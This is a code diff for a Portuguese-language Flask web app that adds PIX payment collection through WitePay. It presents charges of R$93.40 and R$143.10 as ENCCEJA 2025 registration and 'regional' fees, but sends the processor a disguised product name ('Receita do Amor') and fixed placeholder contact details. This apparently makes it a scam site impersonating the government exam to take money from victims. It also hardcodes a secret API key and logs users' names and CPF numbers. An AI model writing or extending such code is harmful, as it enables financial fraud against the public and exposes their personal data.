@@ -11,6 +11,9 @@ from datetime import datetime
 from urllib.parse import parse_qs, urlparse
 from flask import Flask, render_template, request, jsonify, redirect, url_for, session, make_response
 import requests
+import qrcode
+from io import BytesIO
+import base64
 
 # Configurar Flask app
 app = Flask(__name__)
@@ -61,6 +64,116 @@ def generate_transaction_id():
     random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
     return f"TX{timestamp}{random_part}"
 
+def create_witepay_order(user_data: dict, amount_brl: float = 93.40) -> dict:
+    """
+    Cria uma ordem no WitePay seguindo a nova documentação
+    """
+    try:
+        api_key = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
+        url = "https://api.witepay.com.br/v1/order/create"
+        
+        # Converter valor para centavos
+        amount_cents = int(amount_brl * 100)
+        
+        # Limpar CPF (apenas números)
+        cpf_clean = re.sub(r'\D', '', user_data.get('cpf', ''))
+        
+        # Limpar telefone (apenas números)
+        phone_clean = re.sub(r'\D', '', "(11) 98779-0088")
+        
+        headers = {
+            "x-api-key": api_key,
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "productData": [
+                {
+                    "name": "Receita do Amor",
+                    "value": amount_cents
+                }
+            ],
+            "clientData": {
+                "clientName": user_data.get('nome', 'Cliente'),
+                "clientDocument": cpf_clean,
+                "clientEmail": "gerarpagamentos@gmail.com",
+                "clientPhone": phone_clean
+            }
+        }
+        
+        app.logger.info(f"[WITEPAY] Criando ordem: {payload}")
+        
+        response = requests.post(url, json=payload, headers=headers, timeout=30)
+        
+        if response.status_code == 200:
+            result = response.json()
+            app.logger.info(f"[WITEPAY] Ordem criada: {result}")
+            return result
+        else:
+            app.logger.error(f"[WITEPAY] Erro ao criar ordem: {response.status_code} - {response.text}")
+            return {"error": f"Erro API: {response.status_code}"}
+            
+    except Exception as e:
+        app.logger.error(f"[WITEPAY] Erro na criação da ordem: {str(e)}")
+        return {"error": str(e)}
+
+def create_witepay_charge(order_id: str) -> dict:
+    """
+    Cria uma cobrança PIX no WitePay
+    """
+    try:
+        api_key = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
+        url = "https://api.witepay.com.br/v1/charge/create"
+        
+        headers = {
+            "x-api-key": api_key,
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "orderId": order_id,
+            "paymentMethod": "pix",
+            "webhookUrl": ""  # Opcional
+        }
+        
+        app.logger.info(f"[WITEPAY] Criando cobrança PIX: {payload}")
+        
+        response = requests.post(url, json=payload, headers=headers, timeout=30)
+        
+        if response.status_code == 200:
+            result = response.json()
+            app.logger.info(f"[WITEPAY] Cobrança PIX criada: {result}")
+            return result
+        else:
+            app.logger.error(f"[WITEPAY] Erro ao criar cobrança: {response.status_code} - {response.text}")
+            return {"error": f"Erro API: {response.status_code}"}
+            
+    except Exception as e:
+        app.logger.error(f"[WITEPAY] Erro na criação da cobrança: {str(e)}")
+        return {"error": str(e)}
+
+def generate_qr_code_image(pix_code: str) -> str:
+    """
+    Gera imagem QR Code em base64 a partir do código PIX
+    """
+    try:
+        import qrcode
+        qr = qrcode.QRCode(version=1, box_size=10, border=5)
+        qr.add_data(pix_code)
+        qr.make(fit=True)
+        
+        img = qr.make_image(fill_color="black", back_color="white")
+        buffer = BytesIO()
+        img.save(buffer, format='PNG')
+        buffer.seek(0)
+        
+        qr_code_image = base64.b64encode(buffer.getvalue()).decode()
+        return f"data:image/png;base64,{qr_code_image}"
+        
+    except Exception as e:
+        app.logger.error(f"Erro ao gerar QR code: {str(e)}")
+        return ""
+
 # Routes
 @app.route('/', methods=['GET'])
 @check_referer
@@ -101,13 +214,90 @@ def local_prova():
 @app.route('/pagamento', methods=['GET', 'POST'])
 @check_referer
 def pagamento():
-    """Página de pagamento PIX - aguardando nova integração WitePay"""
+    """Página de pagamento PIX com nova integração WitePay"""
     if request.method == 'POST':
-        # Aguardando nova documentação WitePay
-        return jsonify({
-            'success': False,
-            'error': 'Sistema de pagamento será implementado com nova documentação WitePay'
-        }), 503
+        try:
+            # Obter dados do usuário da sessão
+            user_data = session.get('user_data', {})
+            if not user_data or not user_data.get('cpf') or not user_data.get('nome'):
+                return jsonify({
+                    'success': False,
+                    'error': 'Dados do usuário não encontrados. Reinicie o processo.'
+                }), 400
+            
+            app.logger.info(f"[PAGAMENTO] Processando pagamento para: {user_data.get('nome')} - CPF: {user_data.get('cpf')}")
+            
+            # Valor fixo R$ 93,40
+            amount = 93.40
+            
+            # 1. Criar ordem no WitePay
+            order_result = create_witepay_order(user_data, amount)
+            
+            if "error" in order_result:
+                return jsonify({
+                    'success': False,
+                    'error': f'Erro ao criar ordem: {order_result["error"]}'
+                }), 500
+            
+            # Extrair ID da ordem
+            order_id = order_result.get('id') or order_result.get('orderId')
+            if not order_id:
+                return jsonify({
+                    'success': False,
+                    'error': 'ID da ordem não retornado pela API'
+                }), 500
+            
+            # 2. Criar cobrança PIX
+            charge_result = create_witepay_charge(order_id)
+            
+            if "error" in charge_result:
+                return jsonify({
+                    'success': False,
+                    'error': f'Erro ao criar cobrança PIX: {charge_result["error"]}'
+                }), 500
+            
+            # Extrair dados da cobrança
+            pix_code = charge_result.get('pix_code') or charge_result.get('pixCode') or charge_result.get('qr_code')
+            charge_id = charge_result.get('id') or charge_result.get('chargeId')
+            
+            if not pix_code:
+                return jsonify({
+                    'success': False,
+                    'error': 'Código PIX não retornado pela API'
+                }), 500
+            
+            # Gerar QR Code
+            qr_code_image = generate_qr_code_image(pix_code)
+            
+            # Armazenar dados na sessão
+            session['payment_data'] = {
+                'orderId': order_id,
+                'chargeId': charge_id,
+                'amount': amount,
+                'pixCode': pix_code,
+                'qrCodeImage': qr_code_image,
+                'status': 'pending'
+            }
+            
+            app.logger.info(f"[PAGAMENTO] PIX criado com sucesso - Ordem: {order_id}, Valor: R$ {amount:.2f}")
+            
+            return jsonify({
+                'success': True,
+                'orderId': order_id,
+                'chargeId': charge_id,
+                'amount': amount,
+                'pix_code': pix_code,
+                'qr_code': pix_code,
+                'qrCodeImage': qr_code_image,
+                'description': "Taxa de Inscrição ENCCEJA 2025"
+            })
+            
+        except Exception as e:
+            app.logger.error(f"[PAGAMENTO] Erro no processamento: {str(e)}")
+            return jsonify({
+                'success': False,
+                'error': f'Erro interno: {str(e)}'
+            }), 500
     
     return render_template('pagamento.html')
 
@@ -120,11 +310,93 @@ def inscricao_sucesso():
 @app.route('/create-pix-payment', methods=['POST'])
 @check_referer
 def create_pix_payment():
-    """Aguardando nova integração WitePay"""
-    return jsonify({
-        'success': False,
-        'error': 'Sistema PIX será implementado com nova documentação WitePay'
-    }), 503
+    """Criar pagamento PIX via WitePay - Endpoint alternativo"""
+    try:
+        # Obter dados do usuário da sessão
+        user_data = session.get('user_data', {})
+        if not user_data:
+            return jsonify({
+                'success': False,
+                'error': 'Dados do usuário não encontrados na sessão'
+            }), 400
+        
+        # Definir valor fixo R$ 143,10 para modal de aviso (taxa regional)
+        amount = 143.10
+        
+        # Criar ordem WitePay
+        order_result = create_witepay_order(user_data, amount)
+        
+        if "error" in order_result:
+            return jsonify({
+                'success': False,
+                'error': order_result["error"]
+            }), 500
+        
+        order_id = order_result.get('id') or order_result.get('orderId')
+        
+        if not order_id:
+            return jsonify({
+                'success': False,
+                'error': 'ID da ordem não retornado pela API'
+            }), 500
+        
+        # Criar cobrança PIX
+        charge_result = create_witepay_charge(order_id)
+        
+        if "error" in charge_result:
+            return jsonify({
+                'success': False,
+                'error': charge_result["error"]
+            }), 500
+        
+        pix_code = charge_result.get('pix_code') or charge_result.get('pixCode')
+        qr_code_image = generate_qr_code_image(pix_code) if pix_code else ""
+        
+        return jsonify({
+            'success': True,
+            'transactionId': charge_result.get('id', ''),
+            'pixCode': pix_code,
+            'qrCodeImage': qr_code_image,
+            'amount': amount
+        })
+    
+    except Exception as e:
+        app.logger.error(f"Erro ao criar pagamento PIX: {str(e)}")
+        return jsonify({
+            'success': False,
+            'error': f'Erro interno: {str(e)}'
+        }), 500
+
+@app.route('/verificar-pagamento', methods=['POST'])
+@check_referer
+def verificar_pagamento():
+    """Verifica o status do pagamento WitePay"""
+    try:
+        data = request.get_json()
+        transaction_id = data.get('transactionId') or data.get('chargeId')
+        
+        if not transaction_id:
+            return jsonify({
+                'success': False,
+                'error': 'ID da transação não fornecido'
+            }), 400
+        
+        app.logger.info(f"[PAGAMENTO] Verificando status para transação: {transaction_id}")
+        
+        # Por enquanto retorna status pendente - WitePay não documentou endpoint de consulta
+        return jsonify({
+            'success': True,
+            'status': 'PENDING',
+            'message': 'Aguardando confirmação do pagamento PIX',
+            'transactionId': transaction_id
+        })
+        
+    except Exception as e:
+        app.logger.error(f"[PAGAMENTO] Erro na verificação: {str(e)}")
+        return jsonify({
+            'success': False,
+            'error': f'Erro interno: {str(e)}'
+        }), 500
 
 @app.route('/consultar-cpf-inscricao')
 def consultar_cpf_inscricao():
